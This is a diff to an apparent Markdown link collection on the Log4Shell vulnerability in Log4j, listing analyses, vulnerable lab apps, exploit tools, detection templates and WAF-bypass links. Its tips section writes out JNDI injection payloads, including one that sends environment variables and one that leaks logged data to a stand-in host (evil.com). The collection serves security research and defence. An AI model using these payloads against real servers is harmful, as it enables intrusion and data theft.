@@ -1,10 +1,16 @@
 # TL;DR
 
+![bugcrowd-glossary](https://user-images.githubusercontent.com/35920302/146174656-683a34c6-082f-4ba1-afd7-491b3356dbda.png)
+[CVE-2021-44228 Log4j (and Log4Shell) Executive Explainer by cje@bugcrowd](https://www.slideshare.net/caseyjohnellis/cve202144228-log4j-and-log4shell-executive-explainer-by-cjebugcrowd)
+
+![Log4Shell-timeline](https://user-images.githubusercontent.com/35920302/146178407-14f764fa-a2f9-4024-9265-0aeaa1a03599.png)
+[Source: cutekernel.github.io](https://cutekernel.github.io/technical-illustrations/cves-2021.html)
+
 ![log4shell png](https://user-images.githubusercontent.com/35920302/146170447-915c1f09-8b34-4390-8f1b-95f9cf892c7a.jpeg)
 [Source: musana.net](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
 
-![bugcrowd-glossary](https://user-images.githubusercontent.com/35920302/146174656-683a34c6-082f-4ba1-afd7-491b3356dbda.png)
-[Source: CVE-2021-44228 Log4j (and Log4Shell) Executive Explainer by cje@bugcrowd](https://www.slideshare.net/caseyjohnellis/cve202144228-log4j-and-log4shell-executive-explainer-by-cjebugcrowd)
+![log4j_attack](https://user-images.githubusercontent.com/35920302/146178704-84116a6f-1016-43c4-b1f3-0552dfa0fb03.png)
+[Source: govcert.ch](https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/)
 
 # Technical analysis
 - [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
@@ -21,11 +27,13 @@
 - [Log4Shell, The Worst Java Vulnerability in Years](https://www.youtube.com/watch?v=m_AkCbFc8DM)
 
 # Intentionally vulnerable apps
+- [Solar, exploiting log4j (TryHackMe room by @_JohnHammond)](https://tryhackme.com/room/solar)
 - [PentesterLab Log4j RCE](https://pentesterlab.com/exercises/log4j_rce/course) & [Log4j RCE II](https://pentesterlab.com/exercises/log4j_rce_ii/course)
 - [BugHuntr.io scenario](https://twitter.com/BugHuntrIo/status/1469298538593067012)
 - [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
 
 # Tools & Exploits
+- [woodpecker-appstore/log4j-payload-generator](https://github.com/woodpecker-appstore/log4j-payload-generator)
 - [tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
 - [Thinkst Canary](https://twitter.com/thinkstcanary/status/1469439743905697797)
 - [Huntress Log4Shell Tester](https://log4shell.huntress.com)
@@ -39,6 +47,7 @@
 - [CodeQL query](https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql)
 - [Nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
 - [Burp Intruder in Pitchfork mode](https://twitter.com/ITSecurityguard/status/1470187651844161536)
+- [LogMePwn](https://github.com/0xInfection/LogMePwn)
 
 # Tips
 - [The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars](https://twitter.com/_StaticFlow_/status/1469358229767475205)
@@ -47,6 +56,7 @@
 - [Some events are only logged when an exception ocur, so specially long payloads with unexpected characters may help you trigger those exceptions.](https://twitter.com/pwntester/status/1470435811812380675)
 - [If you omit the closing brace `}` (so the payload would look like `${jndi:ldap://evil.com/`), you will potentially get a bunch of data exfiltrated to your server until the next `}` appears in that data](https://twitter.com/TomAnthonySEO/status/1470374984749133825)
 - [Attack path works in *ANY* java version](https://twitter.com/marcioalm/status/1470361495405875200)
+- [If you’re scanning for Log4Shell at scale, you can easily determine which host is pinging back by adding it to the start of your callback hostname](https://twitter.com/hakluke/status/1469875175839584257)
 
 # Headers
 [TODO]
@@ -55,6 +65,13 @@
 [TODO]
 
 # WAF bypasses
+- <https://twitter.com/wugeej/status/1469982901412728832>
+- <https://twitter.com/BountyOverflow/status/1470001858873802754>
+- <https://twitter.com/h4x0r_dz/status/1469663187079417857>
+- <https://twitter.com/ymzkei5/status/1469765165348704256>
+- <https://twitter.com/wireghoul/status/1469473975449255941>
+- <https://twitter.com/Rezn0k/status/1469523006015750146>
+- 
 
 # Mega threads
 - [Reddit mega thread curated by NCC Group](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/)
